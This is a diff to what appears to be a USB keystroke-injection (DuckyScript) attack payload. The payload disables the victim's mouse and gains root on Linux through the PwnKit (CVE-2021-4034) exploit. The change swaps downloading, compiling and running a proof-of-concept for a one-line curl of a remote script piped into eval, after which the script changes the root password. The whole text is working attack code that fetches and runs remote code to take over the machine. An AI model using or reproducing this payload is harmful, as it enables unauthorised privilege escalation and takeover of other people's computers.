@@ -16,15 +16,11 @@ ENTER
 REM disable mouse
 STRING xinput float 12
 ENTER
-STRING wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
-ENTER
-DELAY 500
-STRING gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
+
+REM run PwnKit
+STRING eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
 ENTER
 DELAY 1000
-STRING ./cve-2021-4034-poc
-ENTER
-DELAY 100
 
 REM change root password
 STRING passwd
